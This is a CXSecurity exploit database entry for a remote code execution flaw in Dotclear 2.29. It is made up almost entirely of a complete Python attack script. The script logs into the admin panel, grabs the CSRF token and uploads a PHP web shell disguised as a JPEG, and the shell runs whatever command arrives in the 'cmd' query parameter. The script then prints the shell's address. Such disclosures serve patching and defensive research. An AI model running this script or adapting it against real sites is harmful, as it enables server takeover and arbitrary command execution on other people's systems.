---
title: Dotclear 2.29 Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2024060011
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-06-05
fetch_date: 2025-10-06T16:55:19.046354
---

# Dotclear 2.29 Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Dotclear 2.29 Remote Code Execution** **2024.06.04**  Credit:  **[Ahmet Umit Bayram](https://cxsecurity.com/author/Ahmet%2BUmit%2BBayram/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: Dotclear 2.29 - Remote Code Execution (RCE)
# Discovered by: Ahmet Ümit BAYRAM
# Discovered Date: 26.04.2024
# Vendor Homepage: https://git.dotclear.org/explore/repos
# Software Link:
https://github.com/dotclear/dotclear/archive/refs/heads/master.zip
# Tested Version: v2.29 (latest)
# Tested on: MacOS
import requests
import time
import random
import string
from bs4 import BeautifulSoup
def generate\_filename(extension=".inc"):
return ''.join(random.choices(string.ascii\_letters + string.digits, k=5)) +
extension
def get\_csrf\_token(response\_text):
soup = BeautifulSoup(response\_text, 'html.parser')
token = soup.find('input', {'name': 'xd\_check'})
return token['value'] if token else None
def login(base\_url, username, password):
print("Exploiting...")
time.sleep(1)
print("Logging in...")
time.sleep(1)
session = requests.Session()
login\_data = {
"user\_id": username,
"user\_pwd": password
}
login\_url = f"{base\_url}/admin/index.php?process=Auth"
login\_response = session.post(login\_url, data=login\_data)
if "Logout" in login\_response.text:
print("Login Successful!")
return session
else:
print("Login Failed!")
return None
def upload\_file(session, base\_url, filename):
print("Shell Preparing...")
time.sleep(1)
boundary = "---------------------------376201441124932790524235275389"
headers = {
"Content-Type": f"multipart/form-data; boundary={boundary}",
"X-Requested-With": "XMLHttpRequest"
}
csrf\_token = get\_csrf\_token(session.get(f"{base\_url}
/admin/index.php?process=Media").text)
payload = (
f"--{boundary}\r\n"
f"Content-Disposition: form-data; name=\"MAX\_FILE\_SIZE\"\r\n\r\n"
f"2097152\r\n"
f"--{boundary}\r\n"
f"Content-Disposition: form-data; name=\"xd\_check\"\r\n\r\n"
f"{csrf\_token}\r\n"
f"--{boundary}\r\n"
f"Content-Disposition: form-data; name=\"upfile[]\"; filename=\"{filename}
\"\r\n"
f"Content-Type: image/jpeg\r\n\r\n"
"<html>\n<body>\n<form method=\"GET\" name=\"<?php echo
basename($\_SERVER['PHP\_SELF']); ?>\">\n"
"<input type=\"TEXT\" name=\"cmd\" autofocus id=\"cmd\" size=\"80\">\n<input
type=\"SUBMIT\" value=\"Execute\">\n"
"</form>\n<pre>\n<?php\nif(isset($\_GET['cmd']))\n{\nsystem($\_GET['cmd']);\n}
\n?>\n</pre>\n</body>\n</html>\r\n"
f"--{boundary}--\r\n"
)
upload\_response = session.post(f"{base\_url}
/admin/index.php?process=Media&sortby=name&order=asc&nb=30&page=1&q=&file\_mode=grid&file\_type=&plugin\_id=&popup=0&select=0",
headers=headers, data=payload.encode('utf-8'))
if upload\_response.status\_code == 200:
print(f"Your Shell is Ready: {base\_url}/public/{filename}")
else:
print("Exploit Failed!")
def main(base\_url, username, password):
filename = generate\_filename()
session = login(base\_url, username, password)
if session:
upload\_file(session, base\_url, filename)
if \_\_name\_\_ == "\_\_main\_\_":
import sys
if len(sys.argv) != 4:
print("Usage: python script.py <siteurl> <username> <password>")
else:
base\_url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
main(base\_url, username, password)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024060011)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top